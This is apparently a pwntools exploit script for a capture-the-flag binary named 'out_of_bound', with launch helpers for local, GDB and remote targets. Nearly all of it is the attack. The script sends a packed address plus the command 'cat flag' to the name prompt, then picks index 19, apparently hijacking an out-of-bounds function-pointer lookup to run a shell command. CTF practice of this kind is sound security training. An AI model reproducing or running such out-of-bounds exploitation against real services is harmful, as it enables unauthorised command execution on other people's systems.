from pwn import *

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

exe = "./out_of_bound"
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'debug'

io = start()
input()
io.sendafter(b"name: ", p32(0x0804a0ac + 4) + b"cat flag")
# write('payload', payload)

io.sendlineafter(b"?",b"19")

io.interactive()